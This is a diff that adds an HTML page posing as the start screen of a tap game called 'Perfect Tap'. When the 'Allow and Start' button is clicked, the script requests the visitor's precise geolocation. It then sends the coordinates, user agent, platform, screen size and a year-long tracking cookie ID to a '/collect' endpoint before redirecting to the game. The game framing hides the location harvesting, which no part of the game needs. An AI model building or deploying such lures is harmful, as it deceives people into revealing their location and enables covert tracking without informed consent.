@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Welcome!</title>
+  
+  <style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+background: radial-gradient(circle at 30% 30%, #2b2d42 0%, #1a1c2c 80%);
+
+    margin: 0;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    color: #e0e0e0;
+  }
+
+  .glow-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle, rgba(255,255,255,0.05) 1.1px, transparent 1px);
+    background-size: 20px 20px;
+    pointer-events: auto;
+    z-index: 0;
+    transition: 
+        background-size 0.3s ease-in-out,
+        filter 0.4s ease-in-out,
+        transform 0.4s ease-in-out;
+    background-position: var(--mouse-x, 50%) var(--mouse-y, 50%);
+
+}
+
+/* Hover effect */
+.glow-bg:hover {
+
+      background: radial-gradient(circle, rgba(255,255,255,0.35) 1.2px, transparent 1px);
+    background-size: 25px 25px; /* Zooms the grid slightly */
+    filter: brightness(1.2); /* Subtle glow */
+    transform: scale(1.01); /* Tiny zoom to create depth */
+    animation:pulseGlow;
+        background-position: var(--mouse-x, 50%) var(--mouse-y, 50%);
+
+}
+
+    @keyframes pulseGlow {
+    0% {
+        filter: brightness(1.2) blur(1px);
+    }
+    50% {
+        filter: brightness(1.4) blur(2px);
+    }
+    100% {
+        filter: brightness(1.2) blur(1px);
+    }
+}
+
+  .card {
+    background: #2b2d42;
+    border-radius: 14px;
+    padding: 2rem;
+    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+    text-align: center;
+    max-width: 500px;
+    width: 90%;
+    z-index: 1;
+    transition: all 0.3s ease;
+  }
+.highlight{
+  font-weight: bold;
+}
+  button {
+    margin-top: 1rem;
+    padding: 0.7rem 1.4rem;
+    border: none;
+    border-radius: 6px;
+    background: #00adb5;
+    color: white;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background 0.3s ease, transform 0.2s ease, width 0.2s ease;
+    min-width: 140px;
+  }
+
+  button:active {
+    transform: scale(0.96);
+  }
+
+  .sent {
+    background-color: #4caf50 !important;
+    animation: sentAnim 0.4s ease-in-out;
+  }
+.failed{
+  background-color: #851e0c !important;
+    animation: shake 0.4s ease-in-out;
+}
+  @keyframes sentAnim {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+    100% { transform: scale(1); }
+  }
+  @keyframes shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-8px); }
+  40% { transform: translateX(8px); }
+  60% { transform: translateX(-6px); }
+  80% { transform: translateX(6px); }
+  100% { transform: translateX(0); }
+}
+
+
+  #status {
+    margin-top: 0.7rem;
+    font-size: 0.9rem;
+    color: #aaa;
+  }
+
+  @media (max-width: 600px) {
+    .card {
+      padding: 1.2rem;
+      font-size: 0.95rem;
+      width: 95%;
+    }
+
+    button {
+      font-size: 0.95rem;
+      padding: 0.6rem 1.2rem;
+      min-width: unset;
+    }
+  }
+</style>
+
+</head>
+<body>
+  <div class="glow-bg"></div>
+  <div class="card">
+    <h1>Welcome, Esteemed Visitor!</h1>
+    <p>Click below to play <span class="highlight">Perfect Tap</span>:</p>
+    <button id="sendBtn">Allow and Start</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+
+    }
+    document.addEventListener("mousemove", function(e) {
+    const x = (e.clientX / window.innerWidth) * 100;
+    const y = (e.clientY / window.innerHeight) * 100;
+
+    const glow = document.querySelector(".glow-bg");
+    glow.style.setProperty("--mouse-x", `${x}%`);
+    glow.style.setProperty("--mouse-y", `${y}%`);
+});
+
+    const sessionStart = Date.now();
+
+    document.getElementById('sendBtn').addEventListener('click', async function () {
+      const btn = this;
+      const statusEl = document.getElementById('status');
+      try {
+        const visitorId = getOrCreateVisitorId();
+
+        const geo = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej);
+        });
+
+        const sessionEnd = Date.now();
+        const sessionDuration = Math.round((sessionEnd - sessionStart) / 1000);
+
+        const data = {
+          visitorId,
+          timestamp: new Date().toISOString(),
+          sessionDuration,
+          location: {
+            lat: geo.coords.latitude,
+            lon: geo.coords.longitude
+          },
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          screen: {
+            width: window.screen.width,
+            height: window.screen.height
+          }
+        };
+
+        const resp = await fetch('/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        if (resp.ok) {
+          statusEl.textContent = 'Permission Allowed!';
+          btn.classList.add('sent');
+          btn.textContent = '✅ Accepted';
+          await sleep(1000);
+          window.location="http://localhost:3000/perfect_tap_v1.html";
+        } else {
+          throw new Error('Server error');
+        }
+      } 
+      catch (err) {
+  console.error(err);
+  btn.classList.add('failed');
+  btn.textContent = '❌ Failed';
+  statusEl.textContent = 'Permission not Allowed.';
+
+  // Optional: Send error log to the server
+  fetch('/log-error', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      message: err.message,
+      stack: err.stack,
+      time: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+    })
+  });
+}
+
+    });
+
+    function getOrCreateVisitorId() {
+      const name = 'visitorId=';
+      const cookies = document.cookie.split(';');
+      for (let cookie of cookies) {
+        if (cookie.trim().startsWith(name)) {
+          return cookie.trim().substring(name.length);
+        }
+      }
+      const newId = crypto.randomUUID();
+      document.cookie = `${name}${newId}; path=/; max-age=31536000`;
+      return newId;
+    }
+  </script>
+</body>
+</html>
